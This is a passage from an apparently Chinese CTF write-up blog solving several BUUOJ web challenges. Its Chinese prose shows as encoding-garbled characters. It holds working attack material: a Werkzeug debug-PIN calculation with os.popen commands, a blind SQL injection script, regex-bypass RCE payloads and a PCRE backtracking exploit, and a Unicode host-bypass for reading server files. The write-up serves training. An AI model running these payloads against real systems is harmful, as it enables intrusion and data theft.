</span></span><span class="line"><span class="cl">    <span class="n">num</span> <span class="o">=</span> <span class="p">(</span><span class="s1">&#39;</span><span class="si">%09d</span><span class="s1">&#39;</span> <span class="o">%</span> <span class="nb">int</span><span class="p">(</span><span class="n">h</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">(),</span> <span class="mi">16</span><span class="p">))[:</span><span class="mi">9</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">rv</span> <span class="o">=</span><span class="kc">None</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="n">rv</span> <span class="ow">is</span> <span class="kc">None</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">group_size</span> <span class="ow">in</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">3</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">num</span><span class="p">)</span> <span class="o">%</span> <span class="n">group_size</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">rv</span> <span class="o">=</span> <span class="s1">&#39;-&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">num</span><span class="p">[</span><span class="n">x</span><span class="p">:</span><span class="n">x</span> <span class="o">+</span> <span class="n">group_size</span><span class="p">]</span><span class="o">.</span><span class="n">rjust</span><span class="p">(</span><span class="n">group_size</span><span class="p">,</span> <span class="s1">&#39;0&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                          <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">num</span><span class="p">),</span> <span class="n">group_size</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">            <span class="k">break</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">rv</span> <span class="o">=</span> <span class="n">num</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">rv</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>238-924-850</p>
<p>Âú®Êä•ÈîôÁïåÈù¢Êü•ÊâæÂà∞ÊúâdebugÁïåÈù¢ÔºåËæìÂÖ•pinÁ†ÅÁÑ∂ÂêéÂ∞±ÂèØ‰ª•Âú®ÁªàÁ´ØRCE‰∫Ü</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">import os
</span></span><span class="line"><span class="cl">os.popen(&#39;ls /&#39;).read()
</span></span><span class="line"><span class="cl">os.popen(&#39;cat /this_is_the_flag.txt&#39;).read()
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="C:%5cUsers%5c10086%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20250221003933125.png"
	
	
	
	loading="lazy"
	
		alt="image-20250221003933125"
	
	
></p>
<h2 id="wustctf2020È¢úÂÄºÊàêÁª©Êü•ËØ¢">[WUSTCTF2020]È¢úÂÄºÊàêÁª©Êü•ËØ¢
</h2><p>Â∏ÉÂ∞îÁõ≤Ê≥®</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">url</span><span class="o">=</span> <span class="s1">&#39;http://575aff7c-bbec-4a7a-8075-c9dd55f58df3.node5.buuoj.cn:81/&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">database</span> <span class="o">=</span><span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">payload1</span> <span class="o">=</span> <span class="s2">&#34;?stunum=1^(ascii(substr((select(database())),</span><span class="si">{}</span><span class="s2">,1))&gt;</span><span class="si">{}</span><span class="s2">)^1&#34;</span> <span class="c1">#Â∫ìÂêç‰∏∫ctf</span>
</span></span><span class="line"><span class="cl"><span class="n">payload2</span> <span class="o">=</span> <span class="s2">&#34;?stunum=1^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=&#39;ctf&#39;)),</span><span class="si">{}</span><span class="s2">,1))&gt;</span><span class="si">{}</span><span class="s2">)^1&#34;</span><span class="c1">#Ë°®Âêç‰∏∫flag,score</span>
</span></span><span class="line"><span class="cl"><span class="n">payload3</span> <span class="o">=</span><span class="s2">&#34;?stunum=1^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#39;flag&#39;)),</span><span class="si">{}</span><span class="s2">,1))&gt;</span><span class="si">{}</span><span class="s2">)^1&#34;</span> <span class="c1">#ÂàóÂêç‰∏∫flag,value</span>
</span></span><span class="line"><span class="cl"><span class="n">payload4</span> <span class="o">=</span> <span class="s2">&#34;?stunum=1^(ascii(substr((select(group_concat(value))from(ctf.flag)),</span><span class="si">{}</span><span class="s2">,1))&gt;</span><span class="si">{}</span><span class="s2">)^1&#34;</span> <span class="c1">#</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">10000</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">low</span> <span class="o">=</span> <span class="mi">32</span>
</span></span><span class="line"><span class="cl">    <span class="n">high</span> <span class="o">=</span> <span class="mi">128</span>
</span></span><span class="line"><span class="cl">    <span class="n">mid</span> <span class="o">=</span><span class="p">(</span><span class="n">low</span> <span class="o">+</span> <span class="n">high</span><span class="p">)</span> <span class="o">//</span> <span class="mi">2</span>
</span></span><span class="line"><span class="cl">    <span class="k">while</span><span class="p">(</span><span class="n">low</span> <span class="o">&lt;</span> <span class="n">high</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="c1"># payload = payload1.format(i,mid)  #Êü•Â∫ìÂêç</span>
</span></span><span class="line"><span class="cl">        <span class="c1"># payload = payload2.format(i,mid)  #Êü•Ë°®Âêç</span>
</span></span><span class="line"><span class="cl">        <span class="c1"># payload = payload3.format(i,mid)  #Êü•ÂàóÂêç</span>
</span></span><span class="line"><span class="cl">        <span class="n">payload</span> <span class="o">=</span> <span class="n">payload4</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">i</span><span class="p">,</span><span class="n">mid</span><span class="p">)</span> <span class="c1">#Êü•flag</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">new_url</span> <span class="o">=</span> <span class="n">url</span> <span class="o">+</span> <span class="n">payload</span>
</span></span><span class="line"><span class="cl">        <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">new_url</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="n">new_url</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="s2">&#34;Hi admin, your score is: 100&#34;</span> <span class="ow">in</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">low</span> <span class="o">=</span> <span class="n">mid</span> <span class="o">+</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">high</span> <span class="o">=</span> <span class="n">mid</span>
</span></span><span class="line"><span class="cl">        <span class="n">mid</span> <span class="o">=</span> <span class="p">(</span><span class="n">low</span> <span class="o">+</span> <span class="n">high</span><span class="p">)</span> <span class="o">//</span><span class="mi">2</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">mid</span> <span class="o">==</span> <span class="mi">32</span> <span class="ow">or</span> <span class="n">mid</span> <span class="o">==</span> <span class="mi">132</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="k">break</span>
</span></span><span class="line"><span class="cl">    <span class="n">database</span> <span class="o">+=</span><span class="nb">chr</span><span class="p">(</span><span class="n">mid</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">database</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">database</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="fbctf2019rceservice">[FBCTF2019]RCEService
</h2><p>ÊèêÁ§∫Áî®jsonÊ†ºÂºèÔºå‰º†ÂèÇÊòØcmd</p>
<p>Êàë‰ª¨ls‰∏Ä‰∏ã</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">{&#34;cmd&#34;:&#34;ls&#34;}
</span></span></code></pre></td></tr></table>
</div>
</div><p>ÂèëÁé∞index.php</p>
<p>‰ΩÜÊòØÂéüÊù•È¢òÁõÆÊúâÊ∫êÁ†Å</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">putenv</span><span class="p">(</span><span class="s1">&#39;PATH=/home/rceservice/jail&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">&#39;cmd&#39;</span><span class="p">]))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nv">$json</span> <span class="o">=</span> <span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">&#39;cmd&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">is_string</span><span class="p">(</span><span class="nv">$json</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s1">&#39;Hacking attempt detected&lt;br/&gt;&lt;br/&gt;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span> <span class="k">elseif</span> <span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/^.*(alias|bg|bind|break|builtin|case|cd|command|compgen|complete|continue|declare|dirs|disown|echo|enable|eval|exec|exit|export|fc|fg|getopts|hash|help|history|if|jobs|kill|let|local|logout|popd|printf|pushd|pwd|read|readonly|return|set|shift|shopt|source|suspend|test|times|trap|type|typeset|ulimit|umask|unalias|unset|until|wait|while|[\x00-\x1FA-Z0-9!#-\/;-@\[-`|~\x7F]+).*$/&#39;</span><span class="p">,</span> <span class="nv">$json</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s1">&#39;Hacking attempt detected&lt;br/&gt;&lt;br/&gt;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s1">&#39;Attempting to run command:&lt;br/&gt;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$cmd</span> <span class="o">=</span> <span class="nx">json_decode</span><span class="p">(</span><span class="nv">$json</span><span class="p">,</span> <span class="k">true</span><span class="p">)[</span><span class="s1">&#39;cmd&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nv">$cmd</span> <span class="o">!==</span> <span class="k">NULL</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nx">system</span><span class="p">(</span><span class="nv">$cmd</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="k">echo</span> <span class="s1">&#39;Invalid input&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s1">&#39;&lt;br/&gt;&lt;br/&gt;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>Âõ†‰∏∫<code>preg_match</code>Âè™ËÉΩÂåπÈÖçÁ¨¨‰∏ÄË°åÔºåÊâÄ‰ª•ËøôÈáåÂèØ‰ª•ÈááÁî®Â§öË°åÁªïËøá„ÄÇ
Âõ†‰∏∫<code>putenv('PATH=/home/rceservice/jail');</code>‰øÆÊîπ‰∫ÜÁéØÂ¢ÉÂèòÈáèÔºåÊâÄ‰ª•Âè™ËÉΩ‰ΩøÁî®ÁªùÂØπË∑ØÂæÑ‰ΩøÁî®catÂëΩ‰ª§Ôºå<code>cat</code>ÂëΩ‰ª§Âú®<code>/bin</code>Êñá‰ª∂Â§π‰∏ã</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?cmd={%0A&#34;cmd&#34;:&#34;/usr/bin/find / -name flag*&#34;%0A}
</span></span><span class="line"><span class="cl">?cmd={%0A&#34;cmd&#34;:&#34;ls /home/rceservice&#34;%0A}
</span></span><span class="line"><span class="cl">?cmd={%0A&#34;cmd&#34;:&#34;/bin/cat /home/rceservice/flag&#34;%0A}
</span></span></code></pre></td></tr></table>
</div>
</div><p>ÂÖ≥‰∫é<code>preg_match</code>ÔºåÊúâpÁ•ûÊõæÁªèËÆ≤ÁöÑ<code>PRCE</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="cl"><span class="n">url</span><span class="o">=</span><span class="s1">&#39;http://d5e835b5-ec7b-41b3-b1f3-8973c7ac6f60.node5.buuoj.cn:81/&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">data</span><span class="o">=</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;cmd&#39;</span><span class="p">:</span><span class="s1">&#39;{&#34;cmd&#34;:&#34;/bin/cat /home/rceservice/flag&#34;,&#34;haha&#34;:&#34;&#39;</span><span class="o">+</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mi">1000000</span><span class="o">+</span><span class="s1">&#39;&#34;}&#39;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">=</span><span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">url</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span><span class="o">.</span><span class="n">text</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">r</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="suctf-2019pythonginx">[SUCTF 2019]Pythonginx
</h2><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/getUrl&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;GET&#39;</span><span class="p">,</span> <span class="s1">&#39;POST&#39;</span><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">getUrl</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="n">url</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&#34;url&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">host</span> <span class="o">=</span> <span class="n">parse</span><span class="o">.</span><span class="n">urlparse</span><span class="p">(</span><span class="n">url</span><span class="p">)</span><span class="o">.</span><span class="n">hostname</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">host</span> <span class="o">==</span> <span class="s1">&#39;suctf.cc&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="s2">&#34;ÊàëÊâå your problem? 111&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="n">parts</span> <span class="o">=</span> <span class="nb">list</span><span class="p">(</span><span class="n">urlsplit</span><span class="p">(</span><span class="n">url</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="n">host</span> <span class="o">=</span> <span class="n">parts</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">host</span> <span class="o">==</span> <span class="s1">&#39;suctf.cc&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="s2">&#34;ÊàëÊâå your problem? 222 &#34;</span> <span class="o">+</span> <span class="n">host</span>
</span></span><span class="line"><span class="cl">    <span class="n">newhost</span> <span class="o">=</span> <span class="p">[]</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">h</span> <span class="ow">in</span> <span class="n">host</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;.&#39;</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">newhost</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">h</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;idna&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="n">parts</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;.&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">newhost</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="c1">#ÂéªÊéâ url ‰∏≠ÁöÑÁ©∫Ê†º</span>
</span></span><span class="line"><span class="cl">    <span class="n">finalUrl</span> <span class="o">=</span> <span class="n">urlunsplit</span><span class="p">(</span><span class="n">parts</span><span class="p">)</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39; &#39;</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="n">host</span> <span class="o">=</span> <span class="n">parse</span><span class="o">.</span><span class="n">urlparse</span><span class="p">(</span><span class="n">finalUrl</span><span class="p">)</span><span class="o">.</span><span class="n">hostname</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">host</span> <span class="o">==</span> <span class="s1">&#39;suctf.cc&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">urllib</span><span class="o">.</span><span class="n">request</span><span class="o">.</span><span class="n">urlopen</span><span class="p">(</span><span class="n">finalUrl</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="s2">&#34;ÊàëÊâå your problem? 333&#34;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>‰ªé‰ª£Á†Å‰∏äÁúãÔºåÊàë‰ª¨ÈúÄË¶ÅÊèê‰∫§‰∏Ä‰∏™urlÔºåÁî®Êù•ËØªÂèñÊúçÂä°Âô®Á´Ø‰ªªÊÑèÊñá‰ª∂</p>
<p>ÁÆÄÂçïÊù•ËØ¥ÔºåÈúÄË¶ÅÈÄÉËÑ±Ââç‰∏§‰∏™ifÔºåÊàêÂäüËøõÂÖ•Á¨¨‰∏â‰∏™if„ÄÇ</p>
<p>ËÄå‰∏â‰∏™if‰∏≠Âà§Êñ≠Êù°‰ª∂ÈÉΩÊòØÁõ∏ÂêåÁöÑÔºå‰∏çËøáÂú®Ê≠§‰πãÂâçÁöÑhostÊûÑÈÄ†Âç¥ÊòØ‰∏çÂêåÁöÑÔºåËøô‰πüÊòØblackhatËØ•ËÆÆÈ¢ò‰∏≠ÊÉ≥Ë¶ÅËØ¥ÊòéÁöÑ‰∏ÄÁÇπ</p>
<p>ÂΩìURL ‰∏≠Âá∫Áé∞‰∏Ä‰∫õÁâπÊÆäÂ≠óÁ¨¶ÁöÑÊó∂ÂÄôÔºåËæìÂá∫ÁöÑÁªìÊûúÂèØËÉΩ‰∏çÂú®È¢ÑÊúü</p>
<p>ÊàñËÄÖÁî®%ÁªïËøá</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">U:‚ÑÜ    A:c/u      ascii:8454  ÔºåÂõ†‰∏∫‚ÑÜÁªèËøáÁºñÁ†ÅËß£Á†ÅÂêéÂ∞±ÊòØc/uÔºåËøôÂíåÊàë‰ª¨ÊÉ≥Ë¶ÅÁöÑfile://suctf.cc/usr/local/nginx/conf/nginx.confÔºåÂàöÂ•Ω‚ÑÜÂèØ‰ª•Êõø‰ª£c/u
</span></span></code></pre></td></tr></table>
</div>
</div><p>Êé•ÁùÄÊàë‰ª¨Âè™ÈúÄË¶ÅÊåâÁÖßgetUrlÂáΩÊï∞ÂÜôÂá∫ÁàÜÁ†¥ËÑöÊú¨Âç≥ÂèØÂæóÂà∞Êàë‰ª¨ËÉΩÂ§üÈÄÉÈÄ∏ÁöÑÊûÑÈÄ†ËØ≠Âè•‰∫Ü</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">urllib.parse</span> <span class="kn">import</span> <span class="n">urlparse</span><span class="p">,</span><span class="n">urlunsplit</span><span class="p">,</span><span class="n">urlsplit</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">urllib</span> <span class="kn">import</span> <span class="n">parse</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">get_unicode</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">65536</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">uni</span><span class="o">=</span><span class="nb">chr</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">url</span><span class="o">=</span><span class="s2">&#34;http://suctf.c</span><span class="si">{}</span><span class="s2">&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">uni</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">getUrl</span><span class="p">(</span><span class="n">url</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">                <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;str: &#34;</span><span class="o">+</span><span class="n">uni</span><span class="o">+</span><span class="s1">&#39; unicode: </span><span class="se">\\</span><span class="s1">u&#39;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">x</span><span class="p">))[</span><span class="mi">2</span><span class="p">:])</span>
</span></span><span class="line"><span class="cl">        <span class="k">except</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">pass</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">getUrl</span><span class="p">(</span><span class="n">url</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">url</span><span class="o">=</span><span class="n">url</span>
</span></span><span class="line"><span class="cl">    <span class="n">host</span><span class="o">=</span><span class="n">parse</span><span class="o">.</span><span class="n">urlparse</span><span class="p">(</span><span class="n">url</span><span class="p">)</span><span class="o">.</span><span class="n">hostname</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">host</span> <span class="o">==</span> <span class="s1">&#39;suctf.cc&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="kc">False</span>
</span></span><span class="line"><span class="cl">    <span class="n">parts</span><span class="o">=</span><span class="nb">list</span><span class="p">(</span><span class="n">urlsplit</span><span class="p">(</span><span class="n">url</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="n">host</span><span class="o">=</span><span class="n">parts</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">host</span> <span class="o">==</span> <span class="s1">&#39;suctf.cc&#39;</span><span class="p">:</span>
